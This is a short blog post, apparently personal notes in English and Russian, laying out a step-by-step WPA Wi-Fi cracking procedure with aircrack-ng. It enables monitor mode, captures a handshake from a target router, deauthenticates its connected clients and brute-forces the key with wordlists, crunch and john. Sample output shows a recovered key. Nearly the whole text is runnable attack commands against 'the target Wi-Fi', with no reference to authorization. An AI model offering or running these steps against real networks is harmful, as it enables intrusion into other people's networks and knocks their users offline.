---
layout: post
title:  "aircrack-ng"
date:   2014-02-25 14:14:31 +0400
categories: wifi
tags: wifi
---

# aircrack-ng
Step 1: iwconfig
Step 2: airmon-ng check kill
Step 3: airmon-ng start wlan0
airodump-ng wlan0mon
Step 5: airodump-ng -c channel –bssid [bssid of wifi] -w [path to write the data of packets] wlan0mon[interface].
Step 6: aireplay-ng –deauth 11 -a [router bssid] interface

You need to de-authenticate the connected clients to the target WiFi network. Use aireplay-ng –deauth 11 -a [router bssid] interface

In my case the command will be aireplay-ng –deauth 11 -a 00:07:26:47:B0:35 wlan0mon




Step 7: aircrack-ng -b [bssid of router] [path to capture packets] -w [path to word list]

Last step in this Aircrack-ng tutorial: Start Cracking the target Wi-fi you need bssid, path to captured packets and path to wordlist. You will find plenty of wordlists to crack wifi networks online or generate your own Wordlist.

In my case the above command will be aircrack-ng -b 00:07:26:47:B0:35  /root/Desktop/hack’-01.cap -w /root/Desktop/wordlist


[https://geekviews.tech/aircrack-ng-tutorial/](https://geekviews.tech/aircrack-ng-tutorial/)

#Переводим в режим мониторинга
airmon-ng start wlan1



#Собираем в файл psk.file данные рукопожатия конкретной bsid
airodump-ng -c 2 --bssid 00:11:22:33:44:55  -w psk.file wlp1s0


#
john --restore=foo | aircrack-ng -w - -b 00:11:22:33:44:55 WPAcrack.cap


#Тестовый подбор сделал через crunch, задал template 5566@@@@
crunch 8 8 0123456789 -t 5566@@@@ aircrack-ng -w - -b 00:11:22:33:44:55 psk.file 


Получаем
      Aircrack-ng 1.2 beta3 r2393

                   [00:08:11] 548872 keys tested (1425.24 k/s)

                           KEY FOUND! [ 55667788 ]

      Master Key    : 5C 9D 3F B6 24 3B 3E 0F F7 C2 51 27 D4 D3 0E 97 
                       CB F0 4A 28 00 93 4A 8E DD 04 77 A3 A1 7D 15 D5 

      Transient Key : 3A 3E 27 5E 86 C3 01 A8 91 5A 2D 7C 97 71 D2 F8 
                       AA 03 85 99 5C BF A7 32 5B 2F CD 93 C0 5B B5 F6 
                       DB A3 C7 43 62 F4 11 34 C6 DA BA 38 29 72 4D B9 
                       A3 11 47 A6 8F 90 63 46 1B 03 89 72 79 99 21 B3 

      EAPOL HMAC    : 9F B5 F4 B9 3C 8B EA DF A0 3E F4 D4 9D F5 16 62
      

[https://www.shellhacks.com/ru/pause-resume-aircrack-ng/](https://www.shellhacks.com/ru/pause-resume-aircrack-ng/)

Минимальная длина пароля 8


В принципе адекватны
[https://aircrack-ng.org/doku.php?id=tutorial](https://aircrack-ng.org/doku.php?id=tutorial)
[https://aircrack-ng.org/doku.php?id=cracking_wpa](https://aircrack-ng.org/doku.php?id=cracking_wpa)
[http://kushavin.ru/articles/16-samyj-prostoj-sposob-vzlomat-wi-fi-reaver](http://kushavin.ru/articles/16-samyj-prostoj-sposob-vzlomat-wi-fi-reaver)
[https://hackware.ru/?p=2387](https://hackware.ru/?p=2387)
https://линуксблог.рф/vzlom-wi-fi-setej-aircrack-ng-kali-linux/

Джон 
[https://hackware.ru/?p=411](https://hackware.ru/?p=411)


Crunch
[https://kali.tools/?p=720](https://kali.tools/?p=720)










